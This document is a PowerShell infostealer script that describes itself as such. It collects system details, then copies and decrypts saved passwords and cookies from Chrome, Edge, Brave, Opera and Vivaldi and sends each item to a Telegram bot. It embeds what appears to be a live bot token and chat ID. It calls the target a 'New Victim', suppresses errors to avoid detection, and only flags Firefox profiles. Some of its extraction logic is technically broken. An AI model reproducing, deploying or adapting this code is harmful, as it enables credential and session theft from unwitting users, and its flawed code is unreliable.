<#
.SYNOPSIS
    Browser credential stealer that exfiltrates data to a Telegram Bot.
.DESCRIPTION
    This script collects system information, passwords, and cookies from Chrome,
    Edge, Brave, Opera, Vivaldi, and Firefox, then sends the data in real-time
    to a Telegram Bot via API.
.NOTES
    Replace the placeholders in the configuration section before use.
#>

# === CONFIGURATION ===
$BOT_TOKEN = "8937080149:AAHlY4jKvTVzcCgcm5ANT8s3-FybGP0wgfg"   # Replace with your actual Bot Token
$CHAT_ID   = "8768304764"     # Replace with your actual Chat ID
# ====================

# Helper function to send data to Telegram
function Send-ToTelegram {
    param([string]$Message)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{
        chat_id = $CHAT_ID
        text    = $Message
        parse_mode = "HTML"
    }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue | Out-Null
    }
    catch {
        # Fail silently to avoid detection
    }
}

# 1. Send system fingerprint
try {
    $computer = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    # Get public IP (using free service)
    $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
    $fingerprint = "🎯 <b>New Victim</b>`n💻 PC: $computer`n👤 User: $username`n🖥️ OS: $os`n🌐 IP: $ip"
    Send-ToTelegram $fingerprint
}
catch {
    Send-ToTelegram "⚠️ Failed to collect system fingerprint."
}

# 2. Password & Cookie extraction function for Chromium browsers
function Extract-ChromiumData {
    param(
        [string]$BrowserName,
        [string]$UserDataPath
    )
    # Paths to databases
    $loginDb = "$UserDataPath\Default\Login Data"
    $cookiesDb = "$UserDataPath\Default\Network\Cookies"
    
    # Extract passwords
    if (Test-Path $loginDb) {
        $tempDb = [System.IO.Path]::GetTempFileName()
        Copy-Item -Path $loginDb -Destination $tempDb -Force
        try {
            $conn = New-Object -ComObject ADODB.Connection
            $conn.Open("Driver={Microsoft Access Text Driver (*.txt, *.csv)};Dbq=$tempDb;Extensions=db,sql;")
            $rs = $conn.Execute("SELECT origin_url, username_value, password_value FROM logins")
            while (-not $rs.EOF) {
                $url = $rs.Fields["origin_url"].Value
                $user = $rs.Fields["username_value"].Value
                $encPass = $rs.Fields["password_value"].Value
                if ($encPass) {
                    try {
                        $decryptedPass = [System.Text.Encoding]::UTF8.GetString(
                            [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $encPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                            )
                        )
                        $msg = "🔑 <b>$BrowserName Password</b>`n🔗 URL: $url`n👤 Username: $user`n🔐 Password: $decryptedPass"
                        Send-ToTelegram $msg
                    }
                    catch {
                        # Decryption may fail for some entries; skip silently
                    }
                }
                $rs.MoveNext()
            }
            $rs.Close()
            $conn.Close()
        }
        finally {
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
    
    # Extract cookies (host, name, value)
    if (Test-Path $cookiesDb) {
        $tempCookies = [System.IO.Path]::GetTempFileName()
        Copy-Item -Path $cookiesDb -Destination $tempCookies -Force
        try {
            $conn2 = New-Object -ComObject ADODB.Connection
            $conn2.Open("Driver={Microsoft Access Text Driver (*.txt, *.csv)};Dbq=$tempCookies;Extensions=db,sql;")
            $rs2 = $conn2.Execute("SELECT host_key, name, encrypted_value FROM cookies")
            while (-not $rs2.EOF) {
                $host_key = $rs2.Fields["host_key"].Value
                $cookieName = $rs2.Fields["name"].Value
                $encValue = $rs2.Fields["encrypted_value"].Value
                if ($encValue) {
                    try {
                        $decryptedValue = [System.Text.Encoding]::UTF8.GetString(
                            [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $encValue, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                            )
                        )
                        $msg = "🍪 <b>$BrowserName Cookie</b>`n🌐 Host: $host_key`n🏷️ Name: $cookieName`n🔑 Value: $decryptedValue"
                        Send-ToTelegram $msg
                    }
                    catch {
                        # Skip silently if decryption fails
                    }
                }
                $rs2.MoveNext()
            }
            $rs2.Close()
            $conn2.Close()
        }
        finally {
            Remove-Item $tempCookies -Force -ErrorAction SilentlyContinue
        }
    }
}

# 3. Chromium-based browsers (Chrome, Edge, Brave, Opera, Vivaldi)
$browsers = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable"
    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
}
foreach ($browser in $browsers.Keys) {
    $userDataPath = $browsers[$browser]
    if (Test-Path $userDataPath) {
        Extract-ChromiumData -BrowserName $browser -UserDataPath $userDataPath
    }
}

# 4. Firefox (Gecko) extraction – simplified placeholder
#   Note: Firefox uses logins.json and key4.db.
#   Full extraction requires more complex handling (master password, key derivation).
#   This example just signals the presence of Firefox profiles.
$firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
if ($firefoxProfiles) {
    foreach ($profile in $firefoxProfiles) {
        $loginsFile = "$($profile.FullName)\logins.json"
        if (Test-Path $loginsFile) {
            # In a real implementation, you would parse logins.json and decrypt using key4.db.
            Send-ToTelegram "🦊 <b>Firefox profile found</b> in $($profile.Name). (Full extraction requires extended logic.)"
        }
    }
}